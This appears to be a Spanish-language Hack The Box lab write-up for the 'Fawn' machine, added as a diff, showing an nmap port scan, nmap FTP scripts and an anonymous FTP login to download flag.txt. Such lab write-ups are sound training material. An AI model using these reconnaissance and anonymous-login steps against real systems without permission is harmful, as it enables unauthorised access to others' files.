@@ -1,0 +1,63 @@
+##Conectados ya a la red de la máquina víctima.. 
+
+##NMAP
+Primer comando para descubrimiento de puertos 
+
+nmap --open -sS -p- -sCV -n -Pn -vvv 10.129.37.62 -oG escaneoNmap
+
+#En este caso en la PC víctima Fawn
+
+Host: 10.129.37.62 ()   Ports: 21/open/tcp//ftp//vsftpd 3.0.3/
+
+#Encontramos el puerto 21 FTP Abierto, por protocolo tcp y su versión 3.0.3
+#El puerto 21 se utiliza para el protocolo FTP (File Transfer Protocol).
+#Es comúnmente utilizado para transferir archivos entre un cliente y un servidor. 
+
+##¿Qué acciones podemos realizar entonces?
+
+#Verificación con ftp
+
+#Si el puerto 21 está abierto y tienes acceso, puedes intentar conectarte usando el cliente FTP:
+
+ftp 10.10.10.1
+
+Esto intentará abrir una sesión FTP. Algunos servidores permiten el acceso anónimo si usas   Usuario: anonymous
+Contraseña: cualquier email (o simplemente dejarlo vacío).
+
+## Uso de nmap con scripts NSE
+
+#Para buscar vulnerabilidades o configuraciones débiles en el servicio FTP, 
+puedes usar los scripts de nmap:
+
+nmap --script ftp* -p 21 10.10.10.1
+
+Esto incluye pruebas como:
+
+Enumeración de usuarios.
+Búsqueda de servidores FTP mal configurados (como permitir acceso anónimo).
+Verificación de servidores vulnerables.
+
+## En este caso no nos permitió buscar los scripts de nmap para ftp.
+# Pero pudimos logearnos como anonymous
+
+  pwn3r   ~/Desktop/HTB/Fawn  ftp 10.129.37.62
+Connected to 10.129.37.62.
+220 (vsFTPd 3.0.3)
+Name (10.129.37.62:pwn3r): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        121          4096 Jun 04  2021 .
+drwxr-xr-x    2 0        121          4096 Jun 04  2021 ..
+-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+226 Directory send OK.
+ftp>
+
+#Una vez visualizada la flag, procedemos a bajarla por el mismo protocolo con GET
+
+get flag.txt // Y se nos descargará en nuesta máquina local.
